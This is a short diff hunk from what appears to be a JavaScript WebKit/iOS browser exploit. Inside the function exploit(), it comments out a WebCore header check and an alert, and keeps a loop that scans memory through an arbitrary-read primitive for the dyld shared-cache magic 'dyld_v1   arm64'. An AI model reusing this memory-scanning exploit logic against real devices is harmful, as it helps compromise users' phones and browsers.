@@ -566,9 +566,9 @@ function exploit(){
        // log(hdr + hdr1)
         while(true)
         {
-        if (memory.readInt64(hdr).lo() == 4277009104) {
-          alert('WebCore ' + hdr + ' post spectre support coming soon...mightnotwork');
-        }
+        //if (memory.readInt64(hdr).lo() == 4277009104) {
+          //alert('WebCore ' + hdr + ' post spectre support coming soon...mightnotwork');
+        //}
         if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64"))
         {
             break;
